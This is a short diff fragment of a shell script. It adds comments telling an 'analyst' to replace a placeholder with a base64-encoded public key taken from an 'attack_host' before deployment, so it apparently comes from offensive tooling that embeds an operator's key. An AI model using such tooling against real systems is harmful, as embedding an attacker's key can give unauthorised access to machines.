@@ -49,6 +49,8 @@ do
 done
 
 encoded:
+# Analyst: replace the line below before deploying — delete it, then in vim
+# run :r !base64 /path/to/pub/key/on/attack_host (adjust path to your keypair)
 b64=$(cat <<EOF
 :r ! base64 /path/to/pub/key/on/attack_host
 EOF
